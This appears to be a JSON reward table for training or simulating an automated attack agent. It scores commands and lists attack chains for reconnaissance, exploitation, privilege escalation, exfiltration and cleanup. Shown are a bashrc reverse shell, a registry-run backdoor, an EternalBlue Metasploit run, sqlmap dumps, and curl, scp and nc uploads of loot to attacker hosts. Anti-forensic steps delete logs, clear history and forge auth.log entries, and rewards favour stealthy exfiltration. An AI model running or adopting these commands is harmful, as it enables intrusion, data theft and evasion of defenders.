@@ -1,0 +1,481 @@
+{
+  "actions": [
+    {
+      "command": "mkdir /tmp/.honeypot",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 3.36
+      }
+    },
+    {
+      "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\Windows\\System32\\backdoor.exe",
+      "reward": 25,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 6.96
+      }
+    },
+    {
+      "command": "find / -perm -4000 2>/dev/null",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": false,
+        "blue_team_alert": 2.91
+      }
+    },
+    {
+      "command": "echo 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1' >> ~/.bashrc",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 5.32
+      }
+    },
+    {
+      "command": "exploit-db --search smtp",
+      "reward": 20,
+      "context": {
+        "phase": "exploit",
+        "stealth": false,
+        "blue_team_alert": 4.11
+      }
+    },
+    {
+      "command": "touch /var/log/.fake_access.log",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 2.41
+      }
+    },
+    {
+      "command": "unset HISTFILE",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": false,
+        "blue_team_alert": 3.31
+      }
+    },
+    {
+      "command": "find / -name '*.log' -delete",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 2.69
+      }
+    },
+    {
+      "command": "smbclient -L \\\\{IP} -p {PORT}",
+      "reward": 3,
+      "context": {
+        "phase": "enumeration",
+        "stealth": true,
+        "blue_team_alert": 6.74
+      }
+    },
+    {
+      "command": "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {IP}; set RPORT {PORT}; run'",
+      "reward": 20,
+      "context": {
+        "phase": "exploit",
+        "stealth": true,
+        "blue_team_alert": 6.58
+      }
+    },
+    {
+      "command": "whois {IP}",
+      "reward": 5,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 1.86
+      }
+    },
+    {
+      "command": "snmpwalk -v2c -c public {IP} -p {PORT}",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 4.7
+      }
+    },
+    {
+      "command": "sqlmap -u http://{IP}:{PORT}/vuln.php?id=1 --batch --dbs",
+      "reward": 20,
+      "context": {
+        "phase": "exploit",
+        "stealth": true,
+        "blue_team_alert": 7.2
+      }
+    },
+    {
+      "command": "sudo -l",
+      "reward": 30,
+      "context": {
+        "phase": "privesc",
+        "stealth": false,
+        "blue_team_alert": 2.68
+      }
+    },
+    {
+      "command": "history -c",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": false,
+        "blue_team_alert": 7.29
+      }
+    },
+    {
+      "command": "curl -X POST -d @loot.zip http://{IP}:{PORT}/upload",
+      "reward": 50,
+      "context": {
+        "phase": "exfiltrate",
+        "stealth": true,
+        "blue_team_alert": 5.35
+      }
+    },
+    {
+      "command": "exploit-db --search telnet",
+      "reward": 20,
+      "context": {
+        "phase": "exploit",
+        "stealth": false,
+        "blue_team_alert": 5.44
+      }
+    },
+    {
+      "command": "nikto -h http://{IP}:{PORT}",
+      "reward": 3,
+      "context": {
+        "phase": "enumeration",
+        "stealth": true,
+        "blue_team_alert": 1.07
+      }
+    },
+    {
+      "command": "exploit-db --search ssh",
+      "reward": 20,
+      "context": {
+        "phase": "exploit",
+        "stealth": false,
+        "blue_team_alert": 1.37
+      }
+    },
+    {
+      "command": "nmap -p {PORT} -T4 -A {IP}",
+      "reward": 5,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 7.15
+      }
+    },
+    {
+      "command": "enum4linux -a {IP} -p {PORT}",
+      "reward": 10,
+      "context": {
+        "phase": "enumeration",
+        "stealth": true,
+        "blue_team_alert": 3.09
+      }
+    },
+    {
+      "command": "linux-exploit-suggester.sh",
+      "reward": 20,
+      "context": {
+        "phase": "exploit",
+        "stealth": true,
+        "blue_team_alert": 7.11
+      }
+    },
+    {
+      "command": "scp secrets.txt attacker@{IP}:/loot/",
+      "reward": 50,
+      "context": {
+        "phase": "exfiltrate",
+        "stealth": true,
+        "blue_team_alert": 1.38
+      }
+    },
+    {
+      "command": "linPEAS.sh",
+      "reward": 3,
+      "context": {
+        "phase": "privesc",
+        "stealth": true,
+        "blue_team_alert": 5.06
+      }
+    },
+    {
+      "command": "ldapsearch -x -h {IP} -p {PORT}",
+      "reward": 3,
+      "context": {
+        "phase": "enumeration",
+        "stealth": true,
+        "blue_team_alert": 0.13
+      }
+    },
+    {
+      "command": "nc {IP} {PORT} < dump.sql",
+      "reward": 3,
+      "context": {
+        "phase": "exfiltrate",
+        "stealth": true,
+        "blue_team_alert": 1.95
+      }
+    },
+    {
+      "command": "rm -rf ~/.bash_history",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 1.17
+      }
+    },
+    {
+      "command": "dig {IP}",
+      "reward": 3,
+      "context": {
+        "phase": "enumeration",
+        "stealth": true,
+        "blue_team_alert": 1.18
+      }
+    },
+    {
+      "command": "nslookup {IP}",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 5.24
+      }
+    },
+    {
+      "command": "exploit-db --search ftp",
+      "reward": 20,
+      "context": {
+        "phase": "exploit",
+        "stealth": false,
+        "blue_team_alert": 4.53
+      }
+    },
+    {
+      "command": "winPEAS.exe",
+      "reward": 3,
+      "context": {
+        "phase": "privesc",
+        "stealth": true,
+        "blue_team_alert": 3.45
+      }
+    },
+    {
+      "command": "echo 'audit success' >> /var/log/auth.log",
+      "reward": 3,
+      "context": {
+        "phase": "recon",
+        "stealth": true,
+        "blue_team_alert": 1.52
+      }
+    },
+    {
+      "command": "curl -X POST -d @loot.zip http://{IP}:67/upload",
+      "reward": 17.206999999999994,
+      "context": {
+        "phase": "exfiltrate",
+        "open_ports": [
+          5958,
+          9348
+        ],
+        "services": [
+          "smtp",
+          "rdp",
+          "ssh"
+        ],
+        "credentials_found": false,
+        "privilege_level": "none",
+        "data_exfiltrated": false,
+        "detection_risk": 0.399,
+        "blue_team_alert": 11.873,
+        "target_ip": "218.82.242.255",
+        "hostname": "host-528",
+        "artifacts": [],
+        "stealth": false,
+        "honeypot_triggered": false,
+        "port_lockdown": false
+      }
+    },
+    {
+      "command": "curl -X POST -d @loot.zip http://{IP}:5958/upload",
+      "reward": -86.13,
+      "context": {
+        "phase": "exfiltrate",
+        "open_ports": [
+          5958,
+          9348
+        ],
+        "services": [
+          "smtp",
+          "rdp",
+          "ssh"
+        ],
+        "credentials_found": false,
+        "privilege_level": "none",
+        "data_exfiltrated": false,
+        "detection_risk": 0.59,
+        "blue_team_alert": 32.137,
+        "target_ip": "218.82.242.255",
+        "hostname": "host-528",
+        "artifacts": [],
+        "stealth": false,
+        "honeypot_triggered": false,
+        "port_lockdown": true
+      }
+    },
+    {
+      "command": "curl -X POST -d @loot.zip http://{IP}:197/upload",
+      "reward": 79.524,
+      "context": {
+        "phase": "exfiltrate",
+        "open_ports": [
+          197,
+          484,
+          1168,
+          2209,
+          2916,
+          3248,
+          4133,
+          4548,
+          5077,
+          5714,
+          6023,
+          6338,
+          6625,
+          7265
+        ],
+        "services": [
+          "smb",
+          "mysql",
+          "mysql",
+          "mysql",
+          "smb",
+          "rdp"
+        ],
+        "credentials_found": false,
+        "privilege_level": "none",
+        "data_exfiltrated": false,
+        "detection_risk": 0.068,
+        "blue_team_alert": 1.125,
+        "target_ip": "195.94.219.66",
+        "hostname": "host-795",
+        "artifacts": [],
+        "stealth": false,
+        "honeypot_triggered": false,
+        "port_lockdown": false
+      }
+    }
+  ],
+  "chains": [
+    {
+      "chain_name": "Standard Web Exploitation Chain",
+      "steps": [
+        {
+          "command": "nmap -sS -p- {IP}",
+          "phase": "recon",
+          "expected_reward": 5,
+          "notes": "Initial TCP port scan"
+        },
+        {
+          "command": "gobuster dir -u http://{IP}:{PORT} -w common.txt",
+          "phase": "enumeration",
+          "expected_reward": 7,
+          "notes": "Directory busting for hidden endpoints"
+        },
+        {
+          "command": "sqlmap -u http://{IP}:{PORT}/vuln.php?id=1 --batch --dbs",
+          "phase": "exploit",
+          "expected_reward": 20,
+          "notes": "SQLi database dump"
+        },
+        {
+          "command": "sudo -l",
+          "phase": "privesc",
+          "expected_reward": 30,
+          "notes": "Check sudo permissions"
+        },
+        {
+          "command": "scp secrets.txt attacker@{IP}:/loot/",
+          "phase": "exfiltrate",
+          "expected_reward": 50,
+          "notes": "Exfiltrate harvested data"
+        }
+      ]
+    },
+    {
+      "chain_name": "SMB Enumeration and Exploitation",
+      "steps": [
+        {
+          "command": "nmap -p {PORT} --script=smb-enum-shares {IP}",
+          "phase": "recon",
+          "expected_reward": 5
+        },
+        {
+          "command": "enum4linux -a {IP} -p {PORT}",
+          "phase": "enumeration",
+          "expected_reward": 10
+        },
+        {
+          "command": "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {IP}; run'",
+          "phase": "exploit",
+          "expected_reward": 20
+        },
+        {
+          "command": "winPEAS.exe",
+          "phase": "privesc",
+          "expected_reward": 3
+        },
+        {
+          "command": "curl -X POST -d @loot.zip http://{IP}:{PORT}/upload",
+          "phase": "exfiltrate",
+          "expected_reward": 50
+        }
+      ]
+    },
+    {
+      "chain_name": "Persistence and Cleanup",
+      "steps": [
+        {
+          "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\Windows\\System32\\backdoor.exe",
+          "phase": "persistence",
+          "expected_reward": 25
+        },
+        {
+          "command": "echo 'bash -i >& /dev/tcp/{IP}/4444 0>&1' >> ~/.bashrc",
+          "phase": "persistence",
+          "expected_reward": 3
+        },
+        {
+          "command": "find / -name '*.log' -delete",
+          "phase": "cleanup",
+          "expected_reward": 3
+        },
+        {
+          "command": "history -c",
+          "phase": "cleanup",
+          "expected_reward": 3
+        }
+      ]
+    }
+  ],
+  "scenarios": []
+}
